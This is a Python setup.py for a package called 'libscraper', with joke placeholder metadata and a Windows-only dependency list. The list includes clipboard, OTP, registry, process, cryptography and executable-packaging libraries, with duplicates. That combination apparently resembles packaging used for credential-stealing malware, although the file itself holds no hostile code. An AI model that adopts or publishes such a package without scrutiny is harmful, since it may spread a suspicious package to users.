from setuptools import setup, find_packages

VERSION = '0.0.5'
DESCRIPTION = 'kekw'
LONG_DESCRIPTION = 'kekwkekwkekwkekwkekwkekw'

# Setting up
setup(
    name="libscraper",
    version=VERSION,
    author="Jonas",
    author_email="kekw@kekw.kekw",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=[
    'httpx',
    'pyperclip',
    'pyotp',
    'asyncio',
    'winregistry',
    'psutil',
    'pypiwin32==223',
    'pycryptodome',
    'pyinstaller>=5.0',
    'PIL-tools',
    'asyncio',
    'threaded',
    'requests',
    'datetime',
    'colorama',
    'pillow',
    'customtkinter',
    'pycryptodome',
    'pyperclip',
    'pyfiglet',
    'tqdm',
    'pywin32'
],
    keywords=['python'],
    classifiers=[
        "Operating System :: Microsoft :: Windows",
    ]
)